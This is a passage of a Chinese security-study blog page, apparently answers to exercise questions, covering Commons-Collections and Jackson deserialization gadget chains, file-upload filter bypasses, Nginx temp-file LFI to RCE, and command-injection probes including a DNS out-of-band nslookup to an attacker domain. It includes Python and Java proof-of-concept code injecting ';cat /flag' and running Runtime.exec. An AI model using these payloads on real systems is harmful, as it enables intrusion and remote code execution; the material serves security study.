+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="o">|</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">HashMap</span><span class="p">.</span><span class="na">putForCreate</span><span class="p">()</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w"> </span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">getValue</span><span class="p">()</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">   </span><span class="o">|</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">   </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span>
+</span></code></pre></div>
+   CC7：
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">HashTable</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">|</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">HashTable</span><span class="p">.</span><span class="na">reconstitutionPut</span><span class="p">()</span><span class="w">    </span><span class="c1">//确保LazyMap1和LazyMap2的key不相等但hashCode相等【(&quot;yy&quot;,1)(&quot;zZ&quot;,1)】</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w"> </span><span class="n">LazyMap1</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">LazyMap2</span><span class="p">)</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w"> </span><span class="n">AbstractDecorationMap</span><span class="p">.</span><span class="na">equals</span><span class="p">()</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">   </span><span class="o">|</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">   </span><span class="n">HashMap</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">LazyMap2</span><span class="p">)</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">   </span><span class="o">|</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">   </span><span class="n">AbstractMap</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">LazyMap2</span><span class="p">)</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">     </span><span class="o">|</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">     </span><span class="n">LazyMap2</span><span class="p">.</span><span class="na">get</span><span class="p">()</span>
+</span></code></pre></div></li>
+<li>方法一：大小写、双写绕过【利用还没来只检查小写后缀或只匹配一次】
+   方法二：<code>%00</code>截断<code>;</code> 截断【利用底层实现的语言特性，%00url解码后是空字节，c语言复制时遇到空字节会认为后面没有内容了会自动忽略后面的内容，IIS只解析<code>;</code>之间的内容，但防火墙会看到全部的后缀，因此二者出现了偏差】
+   方法三：多后缀名【WAF可能只从后向前匹配一次后缀名，Apache会从左向右匹配后缀名知道找到第一个它可以识别的】
+   方法四：.htaccess配置文件上传【当中间件允许自己的配置文件被覆盖并且.htaccess不在黑名单中时，可以通过上传该配置文件让中间件将指定后缀名的文件交给php解析器解析执行】
+   方法五：不同后缀名绕过【php3,php5,php7,phtml,pht等】
+   方法六：末尾加上<code>.</code> <code>空格</code>【Windows系统报错文件时会自动清除文件名末尾的.和空格，但防火墙不会】</li>
+<li>CC1是通过InvokerTransformer执行调用任意方法最终执行Runtime.exec()；CC3是通过InstantiateTransformer调用任意类的有参构造方法从而触发特定类TrAXFilter实例化触发TemplatesImpl.newTransformer()从而导致加载恶意字节码执行命令CC1使用的类和方法可能会在黑名单中，CC3使用的类一般不会被禁用且不依赖 Runtime.exec()，可绕过对 Runtime 类的限制。 字节码中可以执行任意 Java 代码，比 exec() 更灵活（如写文件、反弹 Shell）</li>
+<li>时间延时检测<code>;ping -c 10 127.0.0.1;</code>
+   DNS带外检测<code>; nslookup 攻击者域名;</code></li>
+<li>Nginx当请求体大小超过一定数值【由配置决定】时会生成临时文件将请求体中的内容临时保存在磁盘上，只有当请求处理完成才会清除文件，这会导致攻击者不需要利用条件竞争去与usleep()抢时间差
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a> 构造恶意php代码开头的超大请求体
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a> |
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a> 猜测临时文件的fd号
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a> |
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a> 在该请求中对生成的临时文件进行LFI
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a> |
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a> 利用路径规范化绕过realPath()的干扰
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a> |
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a> 实现RCE
+</span></code></pre></div></li>
+</ol>
+<h3 id="_4">代码构造题<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ol>
+<li>检查原始字节流因为request.get_data()返回的是原始字节流【bytes类型】表示形式
+   POC
+   <div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a> <span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a> <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a> <span class="n">url</span><span class="o">=</span><span class="s2">&quot;target&quot;</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;cp037&quot;</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&quot;application/json;charset=</span><span class="si">{</span><span class="n">encoding</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a> <span class="n">json_data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;target&quot;</span><span class="p">:</span><span class="s2">&quot;127.0.0.1;cat /flag&quot;</span><span class="p">}</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a> <span class="n">json_str</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json_data</span><span class="p">)</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a> <span class="n">data</span><span class="o">=</span><span class="n">json_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a> <span class="n">response</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a> <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></code></pre></div></li>
+<li>POC
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC6demo</span><span class="p">{</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">   </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">     </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">ct</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">     </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it1</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;getMethod&quot;</span><span class="p">,</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">     </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Sting</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">     </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">});</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">     </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it2</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;invoke&quot;</span><span class="p">,</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">     </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">       </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">     </span><span class="p">);</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">     </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it3</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">,</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">       </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">       </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;calc&quot;</span><span class="p">}</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">     </span><span class="p">);</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">     </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">ct</span><span class="p">,</span><span class="n">it1</span><span class="p">,</span><span class="n">it2</span><span class="p">,</span><span class="n">it3</span><span class="p">});</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">     </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map1</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="w">     </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap</span><span class="o">=</span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">     </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">t</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="s">&quot;key&quot;</span><span class="p">);</span>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">     </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map2</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
+</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">     </span><span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="s">&quot;value&quot;</span><span class="p">);</span>
+</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>
+</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="w">     </span><span class="n">lazyMap</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&quot;key&quot;</span><span class="p">);</span>
+</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>
+</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="w">     </span><span class="n">Field</span><span class="w"> </span><span class="n">f</span><span class="o">=</span><span class="n">lazyMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;factory&quot;</span><span class="p">);</span>
+</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="w">     </span><span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a><span class="w">     </span><span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span>
+</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a><span class="w">   </span><span class="p">}</span>
+</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="w"> </span><span class="p">}</span>
+</span></code></pre></div>
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>HashMap.readObject() → hash(key) → key.hashCode() 
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a> → TiedMapEntry.hashCode() → getValue() 
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a> → LazyMap.get() → factory.transform() 
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a> → ChainedTransformer → Runtime.exec(&quot;calc&quot;)
+</span></code></pre></div></li>
+</ol>
+<h3 id="_5">综合分析题<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ol>
+<li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链，Jackson开启enableDefaultTyping() 后，可以在通过@class指定反序列化任意类，TemplatesImpl可以加载恶意字节码执行命令，不依赖jdk版本，是jdk内置类不依赖第三方库。利用 _bytecodes 字段加载恶意字节码。 相比 CC 链，Jackson 的 TemplatesImpl 链更加通用且稳定而且稳定</li>
+<li>CC6 无jdk限制，入口为HashMap是基础类，CC1有jdk现在且依赖动态代理，CC5的BadAttributeValueExpException是JMX组件不常见，CC7的HashTable也不让HashMap常见</li>
+<li>多线程并发上传文件同时多线程并发访问文件</li>
+<li>不能完全防御，如果采用基于时间戳的算法可以爆破，攻击者还可以通过上传大文件延长文件处理时间扩大爆破窗口。 如果信息泄露（如目录名出现在错误信息、日志、API 响应中），攻击者可直接获取。 </li>
+<li>正确做法： 使用强随机数（如 UUID.randomUUID()）+ 验证前存于非 Web 可访问目录 + 验证通过后随机化文件名。 </li>
+</ol>
+<h3 id="_6">附加题<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<ol>
+<li>TemplatesImpl.newTransformer()方法是public的，TrAXFilter的构造方法中调用了newTransformer()方法，且TrAXFilter的参数是Template接口类型，TemplatesImpl实现了该接口，所以只需要调用TrAXFilter构造方法时传入TemplatesImpl对象即可触发TemplatesImpl.newTransformer()</li>
+<li>【 2. 替代的入口类 如果 TemplatesImpl 不可用，可以考虑以下替代： 类 原理 com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl 同样涉及 Templates 操作 com.sun.org.apache.bcel.internal.util.ClassLoader BCEL 类加载器，可加载恶意字节码 groovy.lang.GroovyShell 加载 Groovy 脚本执行命令（需 Groovy 依赖） javax.script.ScriptEngineManager 加载 JavaScript 等脚本引擎执行代码 org.springframework.expression.spel.standard.SpelExpression SpEL 表达式执行（需 Spring 依赖）实际利用中，需要根据目标环境中的类来选择替代链。 】</li>
+</ol>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 27, 2026 11:32:31 UTC"><span class="timeago" datetime="2026-05-27T11:32:31+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 27, 2026 11:32:31 UTC">2026-05-27</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 27, 2026 11:32:31 UTC"><span class="timeago" datetime="2026-05-27T11:32:31+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 27, 2026 11:32:31 UTC">2026-05-27</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+<script src="https://giscus.app/client.js"
+        data-repo="ethicalpaws/youth-sandbox"
+        data-repo-id="R_kgDOSdu3Yw"
+        data-category="General"
+        data-category-id="DIC_kwDOSdu3Y84C9EfW"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+<!-- 可选：自动跟随深色/浅色模式 -->
+<script>
+    // 监听主题切换，同步 Giscus 主题
+    const giscusTheme = () => {
+        const isDark = document.querySelector('[data-md-color-scheme="slate"]') !== null;
+        const iframe = document.querySelector('iframe.giscus-frame');
+        if (!iframe) return;
+        iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: isDark ? 'dark' : 'light' } } },
+            'https://giscus.app'
+        );
+    };
+
+    // 当主题切换时触发
+    const observer = new MutationObserver(giscusTheme);
+    observer.observe(document.querySelector('[data-md-component="palette"]'), { attributes: true });
+</script>
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2026 青春沙盒 - 记录技术，也记录青春
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/ethicalpaws" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://twitter.com/ethicalpaws" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
